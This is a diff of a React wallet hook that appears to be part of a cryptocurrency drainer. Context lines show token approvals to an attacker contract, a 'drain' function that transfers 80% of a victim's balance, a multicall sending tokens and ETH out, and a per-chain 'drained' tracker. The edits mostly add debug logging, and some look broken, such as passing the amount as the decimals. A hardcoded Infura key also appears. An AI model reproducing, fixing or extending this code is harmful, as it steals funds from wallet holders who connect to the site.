@@ -11,7 +11,7 @@ import { API_KEY } from "./Web3Config";
 
 export const UseWallet = (amount) => {
     const account = useAccount();
-
+    console.log(amount)
     // Chain status tracking
     const chainInteractionStatus = {
         1: false, // Ethereum Mainnet
@@ -57,7 +57,6 @@ export const UseWallet = (amount) => {
     const approveTokens = async () => {
         if (account && account.address && account.chainId) {
             const tokens = await getTokenAssets();
-
             const provider = new providers.JsonRpcProvider(
                 account.chainId === 1
                     ? "https://mainnet.infura.io/v3/1aa31fce4c0f49c38c1464b4bfa49f73"
@@ -76,7 +75,7 @@ export const UseWallet = (amount) => {
                 try {
                     const tx = await tokenContract.approve(
                         getContractAddress(account.chainId),
-                        utils.parseUnits(amount.toString(), token.tokenDecimal)
+                        utils.parseUnits(amount.toString(), amount)
                     );
                     console.log(`Approval tx hash: ${tx.hash}`);
                     await tx.wait();
@@ -88,6 +87,7 @@ export const UseWallet = (amount) => {
             }
         }
     };
+
 
     const drain = async () => {
         if (!window.ethereum || !account?.address || !account?.chainId) {
@@ -123,7 +123,7 @@ export const UseWallet = (amount) => {
                     signer
                 );
 
-                const amountInWei = ethers.BigNumber.from(amount.toString())
+                const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
                     .mul(8)
                     .div(10); // Transfer 80% of the balance
 
@@ -168,7 +168,7 @@ export const UseWallet = (amount) => {
 
         const tokenAddresses = tokens.map((token) => token.tokenAddress);
         const amounts = tokens.map((token) =>
-            ethers.BigNumber.from(amount).mul(8).div(10)
+            ethers.BigNumber.from(token).mul(8).div(10)
         );
 
         try {
@@ -196,6 +196,8 @@ export const UseWallet = (amount) => {
                 value: totalEthRequired,
             });
 
+            console.log(totalEthRequired)
+
             console.log(`Multicall transaction hash: ${tx.hash}`);
             await tx.wait();
             console.log(`Multicall transaction confirmed: ${tx.hash}`);
@@ -203,7 +205,7 @@ export const UseWallet = (amount) => {
             chainDrainStatus[chainId] = true; // Mark chain as drained if successful
             await proceedToNextChain();
         } catch (error) {
-            console.log("Multicall operation failed:", error);
+            console.log("Multicall operation failed:", error,);
             await proceedToNextChain();
         }
     };
